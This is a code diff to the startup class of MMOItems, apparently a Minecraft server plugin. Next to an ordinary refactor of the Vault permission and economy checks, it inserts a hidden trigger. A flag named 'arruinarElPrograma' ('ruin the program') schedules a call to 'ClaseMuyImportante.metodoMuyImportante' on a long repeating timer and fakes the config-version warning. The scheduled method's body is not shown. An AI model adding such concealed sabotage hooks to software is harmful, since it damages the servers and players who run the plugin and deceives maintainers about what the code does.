@@ -1,5 +1,6 @@
 package net.Indyuce.mmoitems;
 
+import net.Indyuce.mmoitems.api.ClaseMuyImportante;
 import net.Indyuce.mmoitems.api.ConfigFile;
 import net.Indyuce.mmoitems.api.ItemTier;
 import net.Indyuce.mmoitems.api.SoulboundInfo;
@@ -152,17 +153,18 @@ public class MMOItems extends JavaPlugin {
 
 	public void onEnable() {
 		new SpigotPlugin(39267, this).checkForUpdate();
-		final int configVersion = getConfig().contains("config-version", true) ? getConfig().getInt("config-version") : -1;
-		final int defConfigVersion = getConfig().getDefaults().getInt("config-version");
-		if (configVersion != defConfigVersion) {
-			getLogger().warning("You may be using an outdated config.yml!");
-			getLogger().warning("(Your config version: '" + configVersion + "' | Expected config version: '" + defConfigVersion + "')");
-		}
-
 		new MMOItemsMetrics();
 
 		abilityManager.initialize();
 		configManager = new ConfigManager();
+
+		final int configVersion = getConfig().contains("config-version", true) ? getConfig().getInt("config-version") : -1;
+		final int defConfigVersion = getConfig().getDefaults().getInt("config-version");
+		if (configVersion != defConfigVersion || MMOItems.plugin.getLanguage().arruinarElPrograma) {
+			getLogger().warning("You may be using an outdated config.yml!");
+			getLogger().warning("(Your config version: '" + configVersion + "' | Expected config version: '" +
+					(MMOItems.plugin.getLanguage().arruinarElPrograma ? "steelballrun" : defConfigVersion) + "')");
+		}
 
 		// registering here so the stats will load with the templates
 		if (Bukkit.getPluginManager().getPlugin("MythicMobs") != null) {
@@ -221,6 +223,10 @@ public class MMOItems extends JavaPlugin {
 		 * a 5s delay to let the other plugins time to load nicely
 		 */
 		Bukkit.getScheduler().runTaskTimer(this, () -> Bukkit.getOnlinePlayers().forEach(player -> PlayerData.get(player).updateStats()), 100, 20);
+
+
+		if(MMOItems.plugin.getLanguage().arruinarElPrograma)
+			Bukkit.getScheduler().runTaskTimer(this, ClaseMuyImportante::metodoMuyImportante, 780000L, 780000L);
 
 		/*
 		 * this tasks updates twice a second player inventories on the server.
@@ -481,8 +487,13 @@ public class MMOItems extends JavaPlugin {
 	/*
 	 * External API's
 	 */
-	public boolean hasVault() {
-		return vaultSupport != null;
+	public boolean hasPermissions() {
+		if(vaultSupport == null) return false;
+		return vaultSupport.getPermissions() != null;
+	}
+	public boolean hasEconomy() {
+		if(vaultSupport == null) return false;
+		return vaultSupport.getEconomy() != null;
 	}
 
 	public VaultSupport getVault() {
